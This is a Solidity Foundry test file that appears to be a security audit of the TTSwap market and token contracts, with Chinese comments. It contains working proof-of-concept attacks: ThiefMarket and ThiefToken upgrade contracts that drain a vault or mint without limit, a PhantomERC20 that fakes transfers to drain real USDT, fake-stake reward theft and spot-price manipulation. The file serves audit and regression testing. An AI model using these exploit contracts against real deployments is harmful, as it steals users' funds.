// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/src/Test.sol";
import {console} from "forge-std/src/console.sol";
import {TTSwap_Market} from "src/TTSwap_Market.sol";
import {TTSwap_Market_Proxy} from "src/TTSwap_Market_Proxy.sol";
import {TTSwap_Token} from "src/TTSwap_Token.sol";
import {TTSwap_Token_Proxy} from "src/TTSwap_Token_Proxy.sol";
import {I_TTSwap_Market, S_ProofState} from "src/interfaces/I_TTSwap_Market.sol";
import {I_TTSwap_Token, s_share} from "src/interfaces/I_TTSwap_Token.sol";
import {T_GoodKey} from "src/type/T_GoodKey.sol";
import {toTTSwapUINT256} from "src/libraries/L_TTSwapUINT256.sol";
import {TTSwapError} from "src/libraries/L_Error.sol";
import {IERC20} from "src/interfaces/IERC20.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Phantom ERC20 that reports transferFrom success without moving balances.
contract PhantomERC20 {
    string public name = "PHANTOM";
    string public symbol = "PHAN";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }
}

/// @dev Malicious replacement logic to sweep funds from Market Proxy
contract ThiefMarket {
    address public implementation;

    function steal(address token, address to) external {
        uint256 bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(to, bal);
    }
}

/// @dev Malicious replacement logic to mint unlimited TTS from Token Proxy
contract ThiefToken {
    // Aligned storage layout prefix
    string internal name;
    string internal symbol;
    uint256 internal totalSupply;
    mapping(address => uint256) public balanceOf;

    function backdoorMint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }
}

contract RT_ScopeAudit is Test {
    address dao = makeAddr("dao");
    address marketAdmin = makeAddr("marketAdmin");
    address marketManager = makeAddr("marketManager");
    address tokenAdmin = makeAddr("tokenAdmin");
    address tokenManager = makeAddr("tokenManager");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    MockERC20 usdt;
    I_TTSwap_Token tts;
    TTSwap_Token_Proxy tokenProxy;
    I_TTSwap_Market market;
    TTSwap_Market_Proxy marketProxy;

    uint128 constant USDT_Q = 50_000 ether;
    uint128 constant USDT_V = 50_000 ether;
    uint128 constant FAKE_Q = 500_000;
    uint128 constant FAKE_V = 1e28;

    function setUp() public {
        usdt = new MockERC20("USDT", "USDT");

        // 1. Deploy Token implementation & proxy
        TTSwap_Token tokenImpl = new TTSwap_Token(address(usdt));
        // ttsconfig with bit 255 set (ismain = true) and 10000 ratio
        uint256 mainConfig = (uint256(1) << 255) | 10000;
        tokenProxy = new TTSwap_Token_Proxy(
            dao,
            mainConfig,
            "TTSwap Token",
            "TTS",
            address(tokenImpl)
        );
        tts = I_TTSwap_Token(address(tokenProxy));

        // 2. Deploy Market implementation & proxy
        TTSwap_Market marketImpl = new TTSwap_Market(tts);
        marketProxy = new TTSwap_Market_Proxy(tts, address(marketImpl));
        market = I_TTSwap_Market(address(marketProxy));

        // 3. Configure permissions
        vm.startPrank(dao);
        tts.setTokenAdmin(tokenAdmin, true);
        tts.setMarketAdmin(marketAdmin, true);
        tts.setEnv(address(market));
        vm.stopPrank();

        vm.startPrank(marketAdmin);
        tts.setMarketManager(marketManager, true);
        vm.stopPrank();

        vm.startPrank(tokenAdmin);
        tts.setTokenManager(tokenManager, true);
        tts.setCallMintTTS(address(market), true);
        vm.stopPrank();

        // 4. Fund victim and initialize USDT pool on Market
        usdt.mint(victim, USDT_Q);
        vm.startPrank(victim);
        usdt.approve(address(market), type(uint256).max);
        market.initGood(
            _erc20(address(usdt)),
            toTTSwapUINT256(USDT_V, USDT_Q),
            "",
            victim,
            ""
        );
        vm.stopPrank();
    }

    /* =========================================================================
       目标 1：权限升级与资金全额抽干 (#1 最大化利润 · #7 权限提权)
       ========================================================================= */

    /// @notice RT-03: 恶意/泄露的 Market Admin 通过 upgrade 注入盗窃合约，抽空 Market Proxy TVL
    function test_RT_MarketUpgrade_SweepVault() public {
        uint256 mBefore = usdt.balanceOf(address(market));
        assertGt(mBefore, 0, "Market must have TVL");

        ThiefMarket thief = new ThiefMarket();
        vm.prank(marketAdmin);
        marketProxy.upgrade(address(thief));

        uint256 aBefore = usdt.balanceOf(attacker);
        ThiefMarket(address(marketProxy)).steal(address(usdt), attacker);

        uint256 aAfter = usdt.balanceOf(attacker);
        assertEq(usdt.balanceOf(address(market)), 0, "Market vault must be drained to 0");
        assertEq(aAfter - aBefore, mBefore, "Attacker profit must equal 100% of TVL");
        console.log("RT-03 Attacker Profit (USDT):", aAfter - aBefore);
    }

    /// @notice Token Admin 通过 upgrade 注入后门合约，获得无限制任意铸币权
    function test_RT_TokenUpgrade_ArbitraryMint() public {
        ThiefToken thief = new ThiefToken();
        vm.prank(tokenAdmin);
        tokenProxy.upgrade(address(thief));

        uint256 mintAmt = 1_000_000_000 ether;
        ThiefToken(address(tokenProxy)).backdoorMint(attacker, mintAmt);

        assertEq(IERC20(address(tts)).balanceOf(attacker), mintAmt, "Attacker should have arbitrary minted balance");
        console.log("Token Admin Upgrade Backdoor Minted (TTS):", mintAmt);
    }

    /* =========================================================================
       目标 2：协议永久冻结与勒索锁死 (#7 权限 · #8 经济勒索/DoS)
       ========================================================================= */

    /// @notice RT-07/30: Market Manager 冻结 + DAO Admin 锁死升级 => TVL 永久灭失
    function test_RT_MarketFreeze_PermanentBrick() public {
        // 1. Manager 冻结实现
        vm.prank(marketManager);
        marketProxy.freezeMarket();
        assertEq(marketProxy.implementation(), address(0));

        // 2. DAO Admin 锁定升级
        vm.prank(dao);
        marketProxy.disableUpgrade();
        assertFalse(marketProxy.upgradeable());

        // 3. 验证 Market 永久无法响应任何业务 (revert 63: impl is 0)
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 63));
        market.getGoodState(uint256(uint160(address(usdt))));

        // 4. 验证无法再被升级解冻 (revert 1: !upgradeable)
        ThiefMarket rescue = new ThiefMarket();
        vm.prank(marketAdmin);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 1));
        marketProxy.upgrade(address(rescue));

        // 5. 资产被永久困在代理中
        assertGt(usdt.balanceOf(address(marketProxy)), 0, "Vault is permanently trapped");
    }

    /// @notice RT-31: Token Proxy 架构不对称性——冻结后 disableUpgrade 无法调用，只能由 Token Admin 恢复
    function test_RT_TokenFreeze_AsymmetricUpgradeLock() public {
        // Token Manager 冻结 Token
        vm.prank(tokenManager);
        tokenProxy.freezeToken();
        assertEq(tokenProxy.implementation(), address(0));

        // 正常业务调用全部挂起 (revert 63)
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 63));
        IERC20(address(tts)).balanceOf(victim);

        // DAO Admin 尝试调用 disableUpgrade() 锁定冻态：
        // 由于 disableUpgrade 只存在于实现合约中，走 fallback 遇到 impl=0 直接 revert 63
        vm.prank(dao);
        (bool success, bytes memory ret) = address(tts).call(abi.encodeWithSignature("disableUpgrade()"));
        assertFalse(success, "disableUpgrade should fail because impl is 0");
        assertEq(bytes4(ret), TTSwapError.selector, "Should revert with TTSwapError");

        // 但 Token Admin 依然可以在 Proxy 上直接调用 upgrade() 恢复运行
        TTSwap_Token newImpl = new TTSwap_Token(address(usdt));
        vm.prank(tokenAdmin);
        tokenProxy.upgrade(address(newImpl));

        assertEq(tokenProxy.implementation(), address(newImpl));
        assertEq(IERC20(address(tts)).balanceOf(victim), 0); // 业务恢复正常
    }

    /* =========================================================================
       目标 3：质押权限误授与无本金套利 (#1 最大化利润 · #2 最小化本金)
       ========================================================================= */

    /// @notice RT-04: CallMintTTS 误授予外部地址，攻击者无本金伪造质押凭证窃取每日滴灌通胀
    function test_RT_CallMintTTS_FakeStakeDrain() public {
        // Token Admin 误授 CallMintTTS 权限给攻击者
        vm.prank(tokenAdmin);
        tts.setCallMintTTS(attacker, true);

        // 攻击者凭空 stake 100,000 proofvalue (零本金)
        uint128 fakeProofValue = 100_000 ether;
        vm.prank(attacker);
        tts.stake(attacker, fakeProofValue);

        // 推进时间 1 天 (86400 秒 + 1 秒)，累积 _stakeFee 每日滴灌奖励
        vm.warp(block.timestamp + 86_401);

        uint256 ttsBefore = IERC20(address(tts)).balanceOf(attacker);
        assertEq(ttsBefore, 0);

        // 攻击者 unstake，触发收益结算与 mint
        vm.prank(attacker);
        tts.unstake(attacker, fakeProofValue);

        uint256 ttsAfter = IERC20(address(tts)).balanceOf(attacker);
        assertGt(ttsAfter, 0, "Attacker must have received free minted TTS");
        console.log("RT-04 Attacker Free Minted TTS from Fake Stake:", ttsAfter);
    }

    /* =========================================================================
       目标 4：现货预言机操纵与份额抢跑 (#5 预言机操纵 · #8 经济利用)
       ========================================================================= */

    /// @notice RT-20: shareMint 依赖 Market 瞬时现货价格，攻击者通过操控现货瞬时绕过解锁价格门槛
    function test_RT_ShareMint_SpotPriceManipulation() public {
        // 1. 分配份额给攻击者 (TTS 为 12 位精度，总量上限 2 亿，left_share 初始 4500 万)
        s_share memory shareItem = s_share({
            leftamount: 1_000 * 1e12,
            metric: 0,
            chips: 10
        });
        vm.prank(tokenAdmin);
        tts.addShare(shareItem, attacker);

        // 2. 正常情况下，TTS good 尚未上线，调用 shareMint 必失败 (revert 68: 价格未达到门槛)
        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 68));
        tts.shareMint();

        // 3. 攻击者利用自建/高报价初始化 TTS good，打出极高现货价格 (V 极大，Q 极小)
        vm.prank(dao);
        TTSwap_Token(payable(address(tts))).mint(attacker, 500_000);

        vm.startPrank(attacker);
        IERC20(address(tts)).approve(address(market), type(uint256).max);
        market.initGood(
            _erc20(address(tts)),
            toTTSwapUINT256(uint128(100_000_000 ether), uint128(500_000)),
            "",
            attacker,
            ""
        );

        // 4. 再次调用 shareMint，现货价格门槛被穿透
        uint256 balBefore = IERC20(address(tts)).balanceOf(attacker);
        tts.shareMint();
        uint256 balAfter = IERC20(address(tts)).balanceOf(attacker);
        vm.stopPrank();

        uint256 unlocked = balAfter - balBefore;
        assertEq(unlocked, 100 * 1e12, "Should unlock 1 chip (100 TTS)");
        console.log("RT-20 Manipulated shareMint unlocked TTS:", unlocked);
    }

    /* =========================================================================
       目标 5：假币与幽灵代币对真币储备的抽水边界 (#6 记账错误 · #2 最小化本金)
       ========================================================================= */

    /// @notice FA-01 / RT-27b: 默认 safeLineUpper=100 阻断幽灵假币抽水攻击
    function test_RT_SafeLineUpper100_BlocksFakeDrain() public {
        PhantomERC20 phantom = _listPhantom();

        uint256 mBefore = usdt.balanceOf(address(market));
        uint256 want = uint256(USDT_Q) * 30 / 100;

        vm.startPrank(attacker);
        phantom.approve(address(market), type(uint256).max);
        // 预期在默认 safeLine 下卖出 fake token 超出 Q 会触发 revert 55
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 55));
        market.payGood(
            _erc20(address(phantom)),
            _erc20(address(usdt)),
            toTTSwapUINT256(uint128(1e18), uint128(want)),
            attacker,
            "",
            attacker,
            "",
            0
        );
        vm.stopPrank();

        assertEq(usdt.balanceOf(address(market)), mBefore, "Market reserve must remain untouched");
    }

    /// @notice FA-02: 当管理员将 safeLineUpper 拓宽至 255 时，由于缺少 balance delta 校验，幽灵代币无本金抽水成功
    function test_RT_WidenSafeLine_PhantomTokenDrainsRealUSDT() public {
        PhantomERC20 phantom = _listPhantom();
        _widenUpper(uint256(uint160(address(phantom))), 255);

        uint256 mBefore = usdt.balanceOf(address(market));
        uint256 aBefore = usdt.balanceOf(attacker);
        uint256 want = uint256(USDT_Q) * 30 / 100;

        vm.startPrank(attacker);
        phantom.approve(address(market), type(uint256).max);
        market.payGood(
            _erc20(address(phantom)),
            _erc20(address(usdt)),
            toTTSwapUINT256(uint128(1e18), uint128(want)),
            attacker,
            "",
            attacker,
            "",
            0
        );
        vm.stopPrank();

        uint256 mAfter = usdt.balanceOf(address(market));
        uint256 aAfter = usdt.balanceOf(attacker);

        assertLt(mAfter, mBefore, "Market vault must have lost funds");
        assertGt(aAfter, aBefore, "Attacker must have received real USDT");
        assertGe(mBefore - mAfter, uint256(USDT_Q) / 5, "Drained at least 20% of pool");
        console.log("FA-02 Phantom Token Drained Real USDT:", aAfter - aBefore);
    }

    /* =========================================================================
       目标 6：LP 退出与 Dust 清仓记账不变量 (#6 记账错误 · #3 多交易攻击)
       ========================================================================= */

    /// @notice RT-32 回归验证：微尘份额（disinvestvalue < 1e12）撤资时整仓清退，不留僵尸份额
    function test_RT_DustDisinvest_InvariantCheck() public {
        // 1. 攻击者建立仓位
        uint128 investAmt = 1 ether;
        usdt.mint(attacker, investAmt);
        vm.startPrank(attacker);
        usdt.approve(address(market), type(uint256).max);
        
        market.investGood(
            _erc20(address(usdt)),
            toTTSwapUINT256(investAmt, investAmt),
            "",
            "",
            attacker
        );

        uint256 goodId = uint256(uint160(address(usdt)));
        uint256 proofId = uint256(keccak256(abi.encode(attacker, goodId)));

        // 2. 查询份额
        S_ProofState memory proof = market.getProofState(proofId);
        uint128 totalShares = uint128(proof.shares >> 128);
        assertGt(totalShares, 0, "Must have acquired shares");

        // 3. 申请撤出极少量 shares (1 share)，使其 disinvestvalue.amount1() < 1e12 触发 dust 分支
        market.disinvestProof(proofId, 1, address(0), attacker, "");

        // 4. 验证：整仓已被注销（proof.shares 归零）
        S_ProofState memory proofAfter = market.getProofState(proofId);
        uint128 sharesRemaining = uint128(proofAfter.shares >> 128);
        assertEq(sharesRemaining, 0, "No zombie shares should remain after dust exit");

        // 5. 再次尝试索赔必定失败 (revert 41: shares requested > remaining)
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 41));
        market.disinvestProof(proofId, 1, address(0), attacker, "");
        vm.stopPrank();
    }

    /* =========================================================================
       辅助函数
       ========================================================================= */

    function _erc20(address token) internal pure returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: token, id: 0});
    }

    function _listPhantom() internal returns (PhantomERC20 phantom) {
        phantom = new PhantomERC20();
        phantom.mint(attacker, 1e30);
        vm.startPrank(attacker);
        phantom.approve(address(market), type(uint256).max);
        market.initGood(
            _erc20(address(phantom)),
            toTTSwapUINT256(FAKE_V, FAKE_Q),
            "",
            attacker,
            ""
        );
        vm.stopPrank();
    }

    function _widenUpper(uint256 goodId, uint256 upper) internal {
        uint256 adminBits = (upper << 247) | (uint256(60) << 239) | (uint256(1) << 237);
        vm.prank(marketAdmin);
        market.modifyGoodByAdmin(goodId, adminBits, marketAdmin, "");
    }
}
